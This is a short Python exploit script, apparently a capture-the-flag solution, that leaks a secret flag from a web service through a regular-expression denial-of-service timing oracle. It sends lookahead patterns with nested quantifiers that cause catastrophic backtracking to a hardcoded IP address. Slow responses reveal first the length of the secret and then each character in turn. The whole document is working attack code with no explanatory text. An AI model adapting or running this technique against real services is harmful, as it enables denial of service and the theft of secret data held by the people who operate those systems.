import requests
import sys
import time
import random
import string
import re

# constants
THRESHOLD = 1

# predicates
def length_is(n):
    return ".{" + str(n) + "}$"

def nth_char_is(n, c):
    if c == '/':
        return ".{" + str(n-1) + "}" + '\/' + ".*$"
    if c == '\\':
        return ".{" + str(n-1) + "}" + '\\\\' + ".*$"
    return ".{" + str(n-1) + "}" + re.escape(c) + ".*$"

# utilities
def redos_if(regexp, salt):
    return "^(?={})(((.*)*)*)*{}".format(regexp, salt)

def get_request_duration(payload):
  try:
      
    r = requests.get('http://1.230.214.121:20001/', params={'pattern': payload})
    duration = r.elapsed.total_seconds()
  except:
    duration = -1
    exit(1)
  return duration

def prop_holds(prop, salt):
    return get_request_duration(redos_if(prop, salt)) > THRESHOLD

def generate_salt():
    return ''.join([random.choice(string.ascii_letters) for i in range(10)])

# exploit
if __name__ == '__main__':
    # generating salt
    salt = generate_salt()
    while not prop_holds('.*', salt):
        salt = generate_salt()
    print("[+] salt: {}".format(salt))
    
    # leak length
    upper_bound = 100
    secret_length = 0
    for i in range(0, upper_bound):
        if prop_holds(length_is(i), salt):
            secret_length = i            
    print("[+] length: {}".format(secret_length))
    
    S = string.printable
    secret = "FLAG{"
    for i in range(len(secret), secret_length):
        for c in S:
            if prop_holds(nth_char_is(i+1, c), salt):
                secret += c
                print("[*] {}".format(secret))
    print("[+] secret: {}".format(secret))